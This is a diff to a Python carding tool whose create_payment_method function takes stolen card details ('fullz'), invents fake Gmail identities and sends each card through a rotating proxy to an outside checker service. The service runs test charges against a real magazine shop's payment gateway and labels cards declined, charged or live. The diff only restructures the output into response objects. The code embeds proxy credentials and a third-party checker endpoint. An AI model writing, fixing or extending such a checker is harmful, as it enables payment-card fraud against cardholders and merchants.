@@ -84,39 +84,43 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
         cc, mes, ano, cvv = fullz.split("|")
         user = "cristniki" + str(random.randint(9999, 574545))
         mail = f"{user}@gmail.com"
-        
+
         headers = {
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "accept-language": "en-US,en;q=0.9",
-            "user-agent": users,  # mobile/desktop rotation
+            "user-agent": users,
         }
 
-        
         final = await session.get(
             f'https://ayanochk.vip/api/ppcpgatewayccn.php?lista={fullz}&proxy=178.128.69.159:31114:oc-045bd5bf215c66a611bed69974d9892d1715b3242d6ae48965c9989272c520c9:qrewlq6ifcv4&sites=https://geniimagazine.com/shop/genii-magazine-digital&xlite=undefined',
             headers=headers,
         )
 
-        try:
-            response_text = final.text
+        response_text = final.text
 
-            if "DECLINED" in response_text:
-                print(f"❌ 𝗥𝗘𝗦𝗨𝗟𝗧 → Card Declined: {fullz}")
-            elif "CCN CHARGED" in response_text:
-                print(f"🔥 𝗥𝗘𝗦𝗨𝗟𝗧 → CCN $69 Charged: {fullz}")
-            elif "LIVE CCN" in response_text:
-                print(f"✅ 𝗥𝗘𝗦𝗨𝗟𝗧 → INVALID CVV --> CCN: {fullz}")
-            else:
-                print(f"⚠️  API ISSUE: {fullz}")
-        except Exception:
-            print(final.text)
+        if "DECLINED" in response_text:
+            status, message = "declined", "Card Declined"
+        elif "CCN CHARGED" in response_text:
+            status, message = "charged", "CCN $69 Charged"
+        elif "LIVE CCN" in response_text:
+            status, message = "live", "Invalid CVV → CCN"
+        else:
+            status, message = "error", "API ISSUE"
 
-        if proxy_url:
-                print(f"Proxy used: {proxy_url}")
+        return CCResponse(
+            card=fullz,
+            status=status,
+            message=message,
+            proxy_used=proxy_url,
+        )
 
     except Exception as e:
-        print(f"⚠️  API ISSUE: {fullz}")
-        return str(e)
+        return CCResponse(
+            card=fullz,
+            status="error",
+            message=f"Exception: {str(e)}",
+            proxy_used=proxy_url,
+        )
 
 # ---------------------------
 # API ENDPOINTS (Updated to use unique proxy per card)
